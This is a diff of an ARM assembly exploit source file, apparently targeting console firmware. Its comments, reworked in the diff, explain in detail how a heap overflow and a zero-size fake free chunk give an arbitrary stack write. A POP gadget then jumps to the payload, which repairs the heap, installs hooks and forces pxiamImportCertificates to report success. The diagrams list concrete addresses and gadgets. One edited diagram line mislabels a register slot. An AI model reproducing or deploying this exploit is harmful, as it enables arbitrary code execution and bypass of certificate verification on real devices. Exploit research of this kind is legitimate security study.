@@ -28,22 +28,22 @@
 /*
   Here's the stack state when jumping to _start:
 
-  |------------------ RecycleRegion stack frame ------------------|
-  | 080C5DD0:   ...                                               |
-  | 080C5DD4:   ...                                               |
-  | 080C5DD8:   ...                                               |
-  | 080C5DDC:   ...                                               |
-  | 080C5DE0:   ...                                               |
-  | 080C5DE4:   0x08084E08+1  <return address (POP_R4R5R6PC_ADDR)>|
-  |                                                               |
-  |-------------------- FreeToHeap stack frame -------------------|
-  | 080C5DE8:   ...                                               |
-  | 080C5DEC:   ...                                               |
-  | 080C5DF0:   ...                                               |
-  | 080C5DF4:   0x08??????    <pointer to _start (popped to pc)>  |
-  | 080C5DF8:   ...           <--- sp points here                 |
-  | 080C5DFC:   0x08053B3E+1  <return address>                    |
-  |---------------------------------------------------------------|
+  |---------------------- RecycleRegion stack frame ----------------------|
+  | 080C5DD0:   0x08??????    <ptr to new_free_chunk (contains our code)> |
+  | 080C5DD4:   ...                                                       |
+  | 080C5DD8:   ...                                                       |
+  | 080C5DDC:   ...                                                       |
+  | 080C5DE0:   ...                                                       |
+  | 080C5DE4:   0x08084E08+1  <return address (POP_R4R5R6PC_ADDR)>        |
+  |                                                                       |
+  |------------------------ FreeToHeap stack frame -----------------------|
+  | 080C5DE8:   0x08??????    <ptr to new_free_chunk (contains our code)> |                                               |
+  | 080C5DEC:   ...                                                       |
+  | 080C5DF0:   ...                                                       |
+  | 080C5DF4:   0x08??????    <pointer to _start (popped to pc)>          |
+  | 080C5DF8:   ...           <--- sp points here                         |
+  | 080C5DFC:   0x08053B3E+1  <return address>                            |
+  |-----------------------------------------------------------------------|
 
   We gain control when returning from RecycleRegion, therefore we are "hooking"
   the execution flow of FreeToHeap. So we first set sp = 0x080C5DE8 to match
@@ -59,7 +59,9 @@
 _start:
   sub sp, sp, #0x10       // match sp with the FreeToHeap stack frame
 
-  // clean .bss section
+  /*
+    clean .bss section
+  */
   adr r1, _start
   ldr r0, =__bss_start    // offset of .bss section start relative to _start
   ldr r2, =__bss_end      // offset of .bss section end relative to _start
@@ -67,18 +69,22 @@ _start:
   add r0, r0, r1          // address of .bss section
   mov r1, #0
   bl memset               // memset(bss_section, 0, bss_section_size)
+
   /*
+    [sp] holds a pointer (see stack state in above comments) to the free chunk
+    that contains this code (starting somewhere before _start and ending at
+    fake_free_chunk)
     heapRepair removes the chunk that contains this code from the free list
     (we don't want it to be reallocated since it holds our code) and then
     repairs fake_free_chunk
   */
-  //adr r0, _start                  // r0 = &chunk_to_remove->data
-  //sub r0, r0, #MEMCHUNK_HDR_SIZE  // r0 = &chunk_to_remove
   ldr r0, [sp]
   bl heapRepair
   bl installHooks
 
-  // change return code on stack to force success
+  /*
+    change return code of pxiamImportCertificates on stack to force success
+  */
   mov r0, #0
   str r0, [sp, #PXIAM_IMPORT_CERTIFICATES_RETURN_CODE_STACK_OFFSET]
 
@@ -118,26 +124,64 @@ heapAllocate:
   bx r1
 
 /*
-  This is the fake chunk that trigger an arb write on the stack
-  It is repaired once we get code exec (see heapRepair)
+  This is the chunk header overwritten to get an arb write when unlinking.
 
-  Here's the state of the stack when getting the arb write:
-  |------------------ RecycleRegion stack frame ------------------|
-  | 080C5DD0:   ...           <--- sp points here                 |
-  | 080C5DD4:   ...                                               |
-  | 080C5DD8:   ...                                               |
-  | 080C5DDC:   ...                                               |
-  | 080C5DE0:   ...                                               |
-  | 080C5DE4:   0x0803361E+1  <return address (FreeToHeap+0x24)>  |
-  |                                                               |
-  |-------------------- FreeToHeap stack frame -------------------|
-  | 080C5DE8:   ...                                               |
-  | 080C5DEC:   ...                                               |
-  | 080C5DF0:   ...                                               |
-  | 080C5DF4:   0x08??????    <pointer to _start>                 |
-  | 080C5DF8:   ...                                               |
-  | 080C5DFC:   0x08053B3E+1  <return address>                    |
-  |---------------------------------------------------------------|
+
+  ============================= STATE OF THE HEAP ==============================
+
+  The size of the chunk is set to 0, this is required because after overflowing
+  and before freeing, the heap looks as follow:
+
+                          <-our code somewhere here->
+  ------------------------------------------------------------------------------
+   ||                ||                               ||
+   ||  unalloc mem   ||     certificates memchunk     ||    fake_free_chunk
+   ||    size=??     ||    state=alloc, size=0x2800   ||   state=free, size=0
+   ||                ||                               ||
+  ------------------------------------------------------------------------------
+                      <---------overwritten range--------->
+
+  When unlinking the chunks, it creates a new free chunk at the beginning of the
+  unallocated memory region on the left of the certificate memchunk. To compute
+  the size of this newly created chunk it sums the sizes of all three regions.
+  Thus, by setting the fake_free_chunk size to 0, in the end after unlinking we
+  have:
+    new_free_chunk->data + new_free_chunk->size == fake_free_chunk
+  And the heap looks as follow:
+
+                          <-our code somewhere here->
+  ------------------------------------------------------------------------------
+   ||                                                 ||
+   ||  new_free_chunk                                 ||    fake_free_chunk
+   ||  size=??+0x2800                                 ||   state=free, size=0
+   ||                                                 ||
+  ------------------------------------------------------------------------------
+                      <---------overwritten range--------->
+
+  This is great because we can easily find fake_free_chunk knowing the address
+  of new_free_chunk and then repair the heap (see _start and heapRepair).
+
+
+  ============================= STATE OF THE STACK =============================
+
+  To understand how we get code execution let's take a look at the state of the
+  stack when getting the arb write:
+  |----------------------- RecycleRegion stack frame -----------------------|
+  | 080C5DD0:   0x08??????    <ptr to new_free_chunk>   <--- sp points here |
+  | 080C5DD4:   ...                                                         |
+  | 080C5DD8:   ...                                                         |
+  | 080C5DDC:   ...                                                         |
+  | 080C5DE0:   ...                                                         |
+  | 080C5DE4:   0x0803361E+1  <return address (FreeToHeap+0x24)>            |
+  |                                                                         |
+  |------------------------- FreeToHeap stack frame ------------------------|
+  | 080C5DE8:   0x08??????    <ptr to new_free_chunk>                       |
+  | 080C5DEC:   ...                                                         |
+  | 080C5DF0:   ...                                                         |
+  | 080C5DF4:   0x08??????    <pointer to _start>                           |
+  | 080C5DF8:   ...                                                         |
+  | 080C5DFC:   0x08053B3E+1  <return address>                              |
+  |-------------------------------------------------------------------------|
 
   Since the heap state is unknown at runtime we don't known the exact address of
   _start, so we can't directly overwrite the return address of RecycleRegion to
@@ -163,22 +207,22 @@ heapAllocate:
     *(POP_R4R5R6PC_ADDR + 0x8) = RECYCLE_REGION_STACK_RETURN_ADDR - 0xC;
 
   Here's the state of the stack after unlinking the chunk:
-  |------------------ RecycleRegion stack frame ------------------|
-  | 080C5DD0:   ...           <--- sp points here                 |
-  | 080C5DD4:   ...                                               |
-  | 080C5DD8:   ...                                               |
-  | 080C5DDC:   ...                                               |
-  | 080C5DE0:   ...                                               |
-  | 080C5DE4:   0x08084E08+1  <return address (POP_R4R5R6PC_ADDR)>|
-  |                                                               |
-  |-------------------- FreeToHeap stack frame -------------------|
-  | 080C5DE8:   ...           <??? (will pop to r4)>              |
-  | 080C5DEC:   ...           <??? (will pop to r5)>              |
-  | 080C5DF0:   ...           <??? (will pop to r6)>              |
-  | 080C5DF4:   0x08??????    <pointer to _start (will pop to pc)>|
-  | 080C5DF8:   ...                                               |
-  | 080C5DFC:   0x08053B3E+1  <return address>                    |
-  |---------------------------------------------------------------|
+  |----------------------- RecycleRegion stack frame -----------------------|
+  | 080C5DD0:   0x08??????    <ptr to new_free_chunk>   <--- sp points here |
+  | 080C5DD4:   ...                                                         |
+  | 080C5DD8:   ...                                                         |
+  | 080C5DDC:   ...                                                         |
+  | 080C5DE0:   ...                                                         |
+  | 080C5DE4:   0x08084E08+1  <return address (POP_R4R5R6PC_ADDR)>          |
+  |                                                                         |
+  |------------------------- FreeToHeap stack frame ------------------------|
+  | 080C5DE8:   0x08??????    <ptr to new_free_chunk (will pop to r4)>      |
+  | 080C5DEC:   ...           <??? (will pop to r5)>                        |
+  | 080C5DF0:   ...           <??? (will pop to r5)>                        |
+  | 080C5DF4:   0x08??????    <pointer to _start (will pop to pc)>          |
+  | 080C5DF8:   ...                                                         |
+  | 080C5DFC:   0x08053B3E+1  <return address>                              |
+  |-------------------------------------------------------------------------|
 
   So when returning from RecycleRegion, we directly jump to _start!
 */
